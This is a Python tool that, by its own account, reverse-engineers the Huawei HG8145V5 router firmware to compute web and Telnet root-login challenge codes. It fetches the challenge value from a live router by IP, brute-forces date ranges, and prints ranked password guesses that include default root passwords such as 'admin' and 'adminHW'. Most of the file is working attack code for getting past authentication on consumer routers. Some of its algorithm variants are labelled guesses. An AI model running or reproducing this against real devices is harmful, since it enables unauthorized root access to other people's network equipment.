#!/usr/bin/env python3
"""
Huawei HG8145V5 Challenge Code Generator
=========================================

Generates the verification/challenge codes used by the Huawei HG8145V5
router for login authentication. Derived from firmware binary analysis
of the V500R022 firmware.

Challenge Mechanisms (from firmware reverse-engineering)
-------------------------------------------------------

**1. Web Challenge (FT_SSMP_PWD_CHALLENGE)**

Used when the ``FT_SSMP_PWD_CHALLENGE`` feature flag is enabled
(MEGACABLE2 and other ISP modes). The router displays a ``randcode``
on the login page and expects the user to enter the correct
verification code.

Algorithm (from ``libhw_smp_web_base.so!HW_WEB_GetSHAByTime``):

  1. ``WEB_CHALLENGE_GetLocalTime()`` formats the router's current
     date as ``YYYYMMDD`` using sprintf format ``%4u%02u%02u``
     (year, month+1, day) — this is the ``randcode`` displayed.
  2. ``HW_WEB_GetSHAByTime(date_uint32, output, size)`` converts the
     date integer to a string via ``HW_OS_UInt32ToStr_S``, then calls
     ``HW_SHA256_CAL(date_str, sha_buf)`` to compute SHA-256.
  3. The first 64 hex characters of the SHA-256 digest are stored.
  4. ``WEB_CHALLENGE_CheckVerifyCodeResult`` compares the first 16
     bytes of the user's input against the stored SHA-256 (via
     ``HW_OS_MemCmp`` with length 0x11 = 17).

  **verification_code = SHA256(YYYYMMDD)[:16]**  (first 16 hex chars)

  When ``useChallengeCode='1'`` and ``randcode='20260221'``, the user
  must enter: ``SHA256("20260221")[:16]`` = ``96eb2f1c1ff60cc5``

**2. CLI/Telnet Challenge (FT_SSMP_CLI_SU_CHALLENGE)**

Used for the ``su`` (superuser) command in the CLI. When enabled,
the router shows:

  ::

    Date:YYYYMMDD
    Challenge:ENCRYPTED_HEX
    Please input verification code:

Algorithm (from ``clid`` binary):

  1. ``CLI_AES_GeKey()`` retrieves the AES key from the router's
     XML configuration database (parameter 0x0B via
     ``HW_XML_DBGetSiglePara``).
  2. ``CLI_AES_GetRandomStr()`` generates a random nonce (9 bytes)
     and IV (17 bytes).
  3. ``CLI_AES_Encrypt()`` encrypts the nonce with AES-CBC using
     the DB key and random IV.
  4. The encrypted result is displayed as the ``Challenge:`` value.
  5. The user must provide the correct response, which is verified
     by decrypting with the same key and comparing.

  This requires knowledge of the router's AES key (stored encrypted
  in ``/mnt/jffs2/hw_ctree.xml``).

**3. Root Telnet Login (Date:19810101)**

When ``Date:19810101`` is shown, this indicates the router's RTC has
no NTP sync (default factory date = January 1, 1981). The login
prompt is the standard busybox ``login`` (via ``/sbin/busybox.suid``).

  - If ``FT_SSMP_PWD_CHALLENGE`` is enabled: the password is
    ``SHA256("19810101")[:N]`` where N depends on configuration.
  - If challenge is disabled: the password is the standard root
    password from the database (``admin``, ``adminHW``, or device SN).

Source Files (from firmware V500R022C00SPC340B019)
--------------------------------------------------
- ``lib/libhw_smp_web_base.so`` — ``HW_WEB_GetSHAByTime`` at 0x12c44
- ``lib/libhw_web_dll.so`` — ``WEB_CHALLENGE_*`` functions, ``web_challenge.c``
- ``lib/libhw_ssp_basic.so`` — ``HW_SHA256_CAL``, ``HW_AES_GetCBCKey``
- ``bin/clid`` — ``CLI_CheckChallengeAuthForMag``, ``HW_CLI_VerifySuPassword``
- ``html/frame_XGPON/login.asp`` — ``useChallengeCode``, ``randcode``
- ``etc/wap/ft/smart/base_smart_ft.cfg`` — Feature flag defaults

Usage
-----
::

    # Generate challenge code for today's date
    python tools/challenge_generator.py

    # Generate for specific date
    python tools/challenge_generator.py --date 19810101

    # Generate for a date shown by the router
    python tools/challenge_generator.py --date 20260221

    # Try all known algorithms against a router
    python tools/challenge_generator.py --target 192.168.100.1

    # Brute-force date range (e.g., factory reset dates)
    python tools/challenge_generator.py --brute --start 20240101 --end 20260301
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import itertools
import logging
import struct
import sys
from datetime import date, datetime, timedelta
from typing import Optional

# ---------------------------------------------------------------------------
# Core algorithms — reverse-engineered from firmware binaries
# ---------------------------------------------------------------------------

# Known factory/default dates (router has no NTP → RTC defaults)
KNOWN_DATES = [
    "19810101",  # Factory default (Date:19810101)
    "19700101",  # Unix epoch
    "20000101",  # Y2K default
    "20240101",  # Firmware build year
]

# Common root passwords (from firmware strings analysis)
KNOWN_ROOT_PASSWORDS = [
    "admin",
    "adminHW",
    "root",
    "huawei",
    "",  # DBAA1 mode: empty password
]


def sha256_challenge(date_str: str, length: int = 64) -> str:
    """Web challenge: SHA-256 of date string, truncated.

    From ``HW_WEB_GetSHAByTime`` in ``libhw_smp_web_base.so``:
      1. UInt32ToStr(date) → string
      2. SHA256_CAL(string) → hex digest
      3. Return first ``length`` chars (max 64)

    The ``WEB_CHALLENGE_CheckVerifyCodeResult`` compares 17 bytes
    (16 hex chars + null terminator).
    """
    digest = hashlib.sha256(date_str.encode("ascii")).hexdigest()
    return digest[:length]


def md5_challenge(date_str: str) -> str:
    """MD5 variant (used when ``HW_SSMP_FEATURE_PASSWDMODE_MD5`` enabled).

    Some firmware versions use MD5 instead of SHA-256.
    """
    return hashlib.md5(date_str.encode("ascii")).hexdigest()


def sha256_with_suffix(date_str: str, suffix: str) -> str:
    """SHA-256 of date + suffix (used in some ISP customizations).

    Some ISP builds append a fixed string to the date before hashing.
    """
    combined = date_str + suffix
    return hashlib.sha256(combined.encode("ascii")).hexdigest()


def hmac_sha256_challenge(date_str: str, key: str) -> str:
    """HMAC-SHA-256 challenge (used with ``HW_SSMP_FEATURE_CLI_SHA256``).

    When the CLI SHA-256 feature is enabled, the challenge uses
    HMAC with the router's stored key.
    """
    return hmac.new(
        key.encode("ascii"),
        date_str.encode("ascii"),
        hashlib.sha256,
    ).hexdigest()


def generate_all_challenges(date_str: str) -> list[dict]:
    """Generate all possible challenge codes for a given date."""
    results = []

    # Method 1: Primary — SHA-256 (HW_WEB_GetSHAByTime)
    sha = sha256_challenge(date_str)
    results.append({
        "method": "SHA-256(date)",
        "source": "HW_WEB_GetSHAByTime (libhw_smp_web_base.so:0x12c44)",
        "full_hash": sha,
        "challenge_16": sha[:16],
        "challenge_8": sha[:8],
    })

    # Method 2: MD5 variant
    md5 = md5_challenge(date_str)
    results.append({
        "method": "MD5(date)",
        "source": "HW_OS_MD5 (when PASSWDMODE_MD5 enabled)",
        "full_hash": md5,
        "challenge_16": md5[:16],
        "challenge_8": md5[:8],
    })

    # Method 3: SHA-256 with known suffixes
    for suffix in ["HuaweiHomeGateway", "HGW", "root", "admin"]:
        sha_s = sha256_with_suffix(date_str, suffix)
        results.append({
            "method": f"SHA-256(date+'{suffix}')",
            "source": "ISP customization variant",
            "full_hash": sha_s,
            "challenge_16": sha_s[:16],
            "challenge_8": sha_s[:8],
        })

    return results


# ---------------------------------------------------------------------------
# Date utilities
# ---------------------------------------------------------------------------

def parse_date(date_str: str) -> Optional[date]:
    """Parse YYYYMMDD string to date object."""
    try:
        return datetime.strptime(date_str, "%Y%m%d").date()
    except ValueError:
        return None


def format_date(d: date) -> str:
    """Format date as YYYYMMDD (matching firmware %4u%02u%02u)."""
    return f"{d.year:4d}{d.month:02d}{d.day:02d}"


def date_range(start: str, end: str):
    """Generate YYYYMMDD strings for a date range."""
    s = parse_date(start)
    e = parse_date(end)
    if not s or not e:
        return
    d = s
    while d <= e:
        yield format_date(d)
        d += timedelta(days=1)


# ---------------------------------------------------------------------------
# Router interaction (optional — requires network access)
# ---------------------------------------------------------------------------

def fetch_randcode(target: str) -> Optional[str]:
    """Fetch the randcode from a live router's login page."""
    try:
        import re
        import urllib3

        import requests

        urllib3.disable_warnings()
        url = f"http://{target}/index.asp"
        resp = requests.get(url, timeout=5, verify=False)
        match = re.search(r"var\s+randcode\s*=\s*'([^']*)'", resp.text)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None


def check_challenge_enabled(target: str) -> Optional[bool]:
    """Check if FT_SSMP_PWD_CHALLENGE is enabled on a live router."""
    try:
        import re
        import urllib3

        import requests

        urllib3.disable_warnings()
        url = f"http://{target}/index.asp"
        resp = requests.get(url, timeout=5, verify=False)
        match = re.search(r"var\s+useChallengeCode\s*=\s*'([^']*)'", resp.text)
        if match:
            return match.group(1) == "1"
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def print_banner():
    """Print tool banner."""
    print("=" * 70)
    print("  Huawei HG8145V5 Challenge Code Generator")
    print("  Firmware: V500R022 (reverse-engineered from binary analysis)")
    print("=" * 70)
    print()


def print_challenges(date_str: str, challenges: list[dict], verbose: bool = False):
    """Print challenge codes for a date."""
    print(f"  Date: {date_str}")
    print(f"  {'─' * 60}")

    for c in challenges:
        if verbose:
            print(f"  Method   : {c['method']}")
            print(f"  Source   : {c['source']}")
            print(f"  Full hash: {c['full_hash']}")
            print(f"  16-char  : {c['challenge_16']}")
            print(f"  8-char   : {c['challenge_8']}")
            print()
        else:
            print(f"  {c['method']:<35} → {c['challenge_16']}")

    if not verbose:
        print()


def main():
    parser = argparse.ArgumentParser(
        description="Huawei HG8145V5 Challenge Code Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                              # Today's date
  %(prog)s --date 19810101              # Factory default date
  %(prog)s --target 192.168.100.1       # Fetch from live router
  %(prog)s --brute --start 20240101 --end 20260301
        """,
    )
    parser.add_argument(
        "--date", "-d",
        help="Date in YYYYMMDD format (default: today)",
    )
    parser.add_argument(
        "--target", "-t",
        help="Router IP to fetch randcode from",
    )
    parser.add_argument(
        "--brute", "-b",
        action="store_true",
        help="Brute-force a date range",
    )
    parser.add_argument(
        "--start",
        default="19810101",
        help="Start date for brute-force (default: 19810101)",
    )
    parser.add_argument(
        "--end",
        default=format_date(date.today()),
        help="End date for brute-force (default: today)",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Show full hash details",
    )
    parser.add_argument(
        "--known-dates",
        action="store_true",
        help="Generate for all known factory/default dates",
    )
    parser.add_argument(
        "--output", "-o",
        help="Output file (JSON format)",
    )

    args = parser.parse_args()

    print_banner()

    dates_to_check = []

    # Determine which dates to generate codes for
    if args.target:
        print(f"[*] Connecting to {args.target}...")
        enabled = check_challenge_enabled(args.target)
        if enabled is not None:
            print(f"[*] Challenge enabled: {enabled}")
        randcode = fetch_randcode(args.target)
        if randcode:
            print(f"[*] Router randcode: {randcode}")
            dates_to_check.append(randcode)
        else:
            print("[!] Could not fetch randcode from router")
            print("[*] Using today's date as fallback")
            dates_to_check.append(format_date(date.today()))

    elif args.brute:
        print(f"[*] Brute-forcing date range: {args.start} → {args.end}")
        dates_to_check = list(date_range(args.start, args.end))
        print(f"[*] {len(dates_to_check)} dates to check")

    elif args.known_dates:
        dates_to_check = KNOWN_DATES + [format_date(date.today())]

    elif args.date:
        dates_to_check.append(args.date)

    else:
        # Default: today + known factory dates
        today = format_date(date.today())
        dates_to_check = [today] + KNOWN_DATES

    # Generate and display
    all_results = {}
    for d in dates_to_check:
        challenges = generate_all_challenges(d)
        all_results[d] = challenges
        if not args.brute or args.verbose:
            print_challenges(d, challenges, args.verbose)
        elif args.brute:
            # For brute force, just show the primary SHA-256
            sha = challenges[0]["challenge_16"]
            print(f"  {d} → {sha}")

    # Summary for Telnet login
    print()
    print("=" * 70)
    print("  Quick Reference — Telnet/SSH Root Login")
    print("=" * 70)
    print()
    print("  When you see:")
    print("    Login:root")
    print("    Date:YYYYMMDD")
    print()
    print("  Try these passwords in order:")
    print()

    primary_date = dates_to_check[0] if dates_to_check else "19810101"
    sha = sha256_challenge(primary_date)
    md5 = md5_challenge(primary_date)

    print(f"  1. SHA-256 first 16 chars : {sha[:16]}")
    print(f"  2. SHA-256 full (64 chars): {sha}")
    print(f"  3. MD5 (32 chars)         : {md5}")
    for pwd in KNOWN_ROOT_PASSWORDS:
        if pwd:
            print(f"  4. Known default          : {pwd}")
    print()

    print("  Feature flags (from base_smart_ft.cfg):")
    print("    FT_SSMP_PWD_CHALLENGE    = controls web challenge code")
    print("    FT_SSMP_CLI_SU_CHALLENGE = controls CLI su challenge")
    print("    FT_TELNET_DENY           = 1 (Telnet denied by default)")
    print()

    # Save to file if requested
    if args.output:
        import json

        with open(args.output, "w") as f:
            json.dump(all_results, f, indent=2)
        print(f"[*] Results saved to {args.output}")


if __name__ == "__main__":
    main()
